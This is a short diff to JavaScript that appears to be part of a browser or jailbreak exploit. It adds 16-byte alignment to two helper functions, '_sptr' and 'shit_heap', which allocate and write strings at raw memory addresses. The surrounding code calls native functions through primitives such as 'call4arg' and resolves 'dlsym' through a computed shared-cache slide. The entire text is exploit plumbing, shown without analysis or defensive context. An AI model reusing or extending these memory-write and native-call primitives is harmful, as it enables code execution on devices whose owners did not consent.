@@ -252,8 +252,10 @@ function _sptr(s) {
 		var addy = call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x150000, 0, 0);
 		global_sptr_addy = call4arg(addy, global_sptr_addy, sptr_size, 0, 0);
 	}
+	global_sptr_addy += (16 - (global_sptr_addy % 16));
 	write_str(global_sptr_addy, s);
 	global_sptr_addy += s.length;
+	sptr_len += (16 - (sptr_len % 16));
 	sptr_len += s.length;
 	return global_sptr_addy - s.length;
 }
@@ -281,7 +283,9 @@ function shit_heap(v) {
 		global_sptr_addy = call4arg(addy, global_sptr_addy, sptr_size, 0, 0);
 	}
 //	write_str(global_sptr_addy, s);
+	global_sptr_addy += (16 - (global_sptr_addy % 16));
 	global_sptr_addy += v;
+	sptr_len += (16 - (sptr_len % 16));
 	sptr_len += v;
 	return global_sptr_addy - v;
 }
